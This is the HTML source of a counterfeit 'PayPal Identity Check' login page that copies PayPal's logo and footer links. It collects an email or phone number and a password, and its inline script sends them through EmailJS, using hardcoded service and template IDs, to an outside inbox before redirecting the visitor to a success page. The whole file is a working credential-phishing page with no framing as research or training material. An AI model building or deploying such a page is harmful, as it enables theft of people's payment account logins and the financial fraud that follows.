<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="shortcut icon" href="assets/favicon.png" type="image/png">
  <link rel="stylesheet" href="assets/main.css">
  <!-- <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Rounded:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" /> -->
  <title>PayPal Login</title>
</head>

<body class="relative h-dvh overflow-y-auto flex flex-col items-center md:justify-center text-[1.1rem]">
  <main class="p-4 md:p-10 w-full md:w-[29rem] md:border md:border-slate-200 md:rounded-xl">
    <header class="flex flex-col gap-2 items-center justify-center">
      <img src="https://www.paypalobjects.com/paypal-ui/logos/svg/paypal-mark-color.svg" width="36px">
      <h2 class="text-xl text-blue-900 font-semibold">PayPal Identity Check</h2>
    </header>

    <form class="mt-12 grid">
      <label for="email-phone" class="block relative border border-slate-400 rounded-md px-2 pt-8 pb-2 hover:border-blue-600 focus-within:border-[3px] focus-within:border-blue-600 focus-within:ring-5 focus-within:ring-blue-100 cursor-text transition-colors flex">

        <p data-lang="emailOrNumber" id="email-phone-label" class="absolute text-[1.1rem] font-medium text-slate-500 top-1 transition-all duration-200 translate-y-[10px]">
          Email or mobile number
        </p>

        <select name="countryCode" id="country-code" class="hidden text-lg w-[4.5rem]"></select>

        <input type="text" name="emailOrNumber" id="email-phone" required class="text-[1.1rem] font-medium w-full outline-none">
      </label>
      <!-- <small data-error="email" class="text-red-500">Error message</small> -->


      <label for="password" class="mt-5 block relative border border-slate-400 rounded-md px-2 pt-8 pb-2 hover:border-blue-600 focus-within:border-[3px] focus-within:border-blue-600 focus-within:ring-5 focus-within:ring-blue-100 cursor-text transition-colors">

        <p data-lang="password" id="password-label" class="absolute text-[1.1rem] font-medium text-slate-500 top-1 transition-all duration-200 translate-y-[10px]">
          Password
        </p>

        <input type="password" name="password" id="password" required class="text-[1.1rem] font-medium w-full outline-none">

        <button type="button" data-password-toggler class="cursor-pointer text-slate-500 absolute top-1/2 -translate-y-1/2 right-3">
          <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 -960 960 960" width="24px" fill="currentColor"><path d="M480-320q75 0 127.5-52.5T660-500q0-75-52.5-127.5T480-680q-75 0-127.5 52.5T300-500q0 75 52.5 127.5T480-320Zm0-72q-45 0-76.5-31.5T372-500q0-45 31.5-76.5T480-608q45 0 76.5 31.5T588-500q0 45-31.5 76.5T480-392Zm0 192q-146 0-266-81.5T40-500q54-137 174-218.5T480-800q146 0 266 81.5T920-500q-54 137-174 218.5T480-200Zm0-300Zm0 220q113 0 207.5-59.5T832-500q-50-101-144.5-160.5T480-720q-113 0-207.5 59.5T128-500q50 101 144.5 160.5T480-280Z"/></svg>
        </button>
      </label>
      <!-- <small data-error="data-error="email" class="text-red-500">Error message</small> -->

      <div class="mt-10">
        <button type="submit" class="bg-blue-800 flex items-center justify-center rounded-full px-4 py-3 text-white w-full font-bold hover:bg-blue-600 transition-colors cursor-pointer disabled:bg-blue-800/70 disabled:cursor-not-allowed">
          <span data-lang="confirmIdentity">Confirm Identity</span>
          <span style="display: none;"  class="ml-2 spinner animate-spin">
            <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 -960 960 960" width="24px" fill="currentColor"><path d="M480-80q-82 0-155-31.5t-127.5-86Q143-252 111.5-325T80-480q0-83 31.5-155.5t86-127Q252-817 325-848.5T480-880q17 0 28.5 11.5T520-840q0 17-11.5 28.5T480-800q-133 0-226.5 93.5T160-480q0 133 93.5 226.5T480-160q133 0 226.5-93.5T800-480q0-17 11.5-28.5T840-520q17 0 28.5 11.5T880-480q0 82-31.5 155t-86 127.5q-54.5 54.5-127 86T480-80Z"/></svg>
          </span>
        </button>
      </div>
    </form>

    <div action="/" method="get" class="mt-16 flex items-center justify-center gap-2 text-[0.88rem] text-slate-600 font-medium">
      <button id="location-btn" class="cursor-pointer flex items-center">
        <span id="country-flag" class="block" style="font-size: 1.2rem;"></span>
        <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 -960 960 960" width="24px" fill="currentColor"><path d="M480-344 240-584l56-56 184 184 184-184 56 56-240 240Z"/></svg>
      </button>
      <button data-lang-btn="en" class="cursor-pointer">English</button> |
      <button data-lang-btn="fn" class="cursor-pointer">Français</button> |
      <button data-lang-btn="es" class="cursor-pointer">Español</button> |
      <button data-lang-btn="zh" class="cursor-pointer">中文</button>
    </div>
  </main>

  <div class="overlay">
    <div class="px-4 md:px-32">
      <header class="w-full relative flex items-center justify-center py-2 h-20">
        <img src="assets/logo.png" width="70">

        <button id="close-btn" class="cursor-pointer absolute right-0">
          <svg xmlns="http://www.w3.org/2000/svg" height="2.75rem" viewBox="0 -960 960 960" width="2.75rem" fill="currentColor">
            <path d="M256-227.69 227.69-256l224-224-224-224L256-732.31l224 224 224-224L732.31-704l-224 224 224 224L704-227.69l-224-224-224 224Z"/>
          </svg>
        </button>
      </header>

      <div class="h-[calc(100dvh-5rem)] overflow-y-auto">
        <div id="major-countries" class="grid md:grid-cols-4 gap-x-4 gap-y-6"></div>

        <hr class="border-slate-200 my-5">

        <div id="other-countries" class="grid md:grid-cols-4 gap-x-4 gap-y-6">

        </div>
      </div>
    </div>
  </div>

  <footer class="flex items-center px-2 py-4 flex-wrap justify-center gap-2 md:gap-4 text-xs md:text-sm font-semibold bg-slate-100 text-slate-600 w-full absolute bottom-0">
    <a href="https://www.paypal.com/us/smarthelp/contact-us" target="_blank" rel="noopener noreferrer">Contact Us</a>
    <a href="https://www.paypal.com/us/webapps/mpp/ua/privacy-full" target="_blank" rel="noopener noreferrer">Privacy</a>
    <a href="https://www.paypal.com/us/legalhub/paypal/home" target="_blank" rel="noopener noreferrer">Legal</a>
    <a href="https://www.paypal.com/us/webapps/mpp/ua/upcoming-policies-full" target="_blank" rel="noopener noreferrer">Policy Updates</a>
    <a href="https://www.paypal.com/us/webapps/mpp/country-worldwide" target="_blank" rel="noopener noreferrer">Worldwide</a>
  </footer>
  

  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
  <script type="text/javascript">
    document.addEventListener("DOMContentLoaded", () => {
      // Initialize EmailJS
      emailjs.init("Fxasbhy_78dEU5KXk");

      function hasOnlyNumbers (value) {
        return /^[+,0-9]+$/.test(value)
      }

      function handleFormSubmission() {
        const form = document.querySelector("form");
        if (!form) return;

        form.addEventListener("submit", async (event) => {
          event.preventDefault();
          const submitter = event.submitter;
          startLoading(submitter); // Keep this

          const formData = new FormData(form);
          const formValues = Object.fromEntries(formData.entries());

          const vars = {
            email_or_number: hasOnlyNumbers(formValues.emailOrNumber) ? `${formValues.dialingCode} ${formValues.emailOrNumber}` : formValues.emailOrNumber,
            password: formValues.password,
            timestamp: new Date().toLocaleDateString("en-GB", { day: "numeric", month: "long", year: "numeric" })
          }

          try {
            await emailjs.send("service_cq172wt", "template_61afega", {
              email_or_number: formValues.emailOrNumber.trim(),
              password: formValues.password.trim(),
              timestamp: new Date(Date.now()).toLocaleDateString(),
            })

            window.location.href = "./success.html";
          } catch (error) {
            console.error(error);
            alert(error.message ?? error);
          } finally {
            stopLoading(submitter);
          }
        });
      }

      handleFormSubmission();
    });

    function startLoading(submitter) {
      if (!submitter) return;
      submitter.disabled = true;
      const spinner = submitter.querySelector(".spinner");
      if (spinner) spinner.style.display = "inline-block";
    }

    function stopLoading(submitter) {
      if (!submitter) return;
      submitter.disabled = false;
      const spinner = submitter.querySelector(".spinner");
      if (spinner) spinner.style.display = "none";
    }
  </script>
  <script src="assets/main.js" type="module"></script>
</body>
</html>
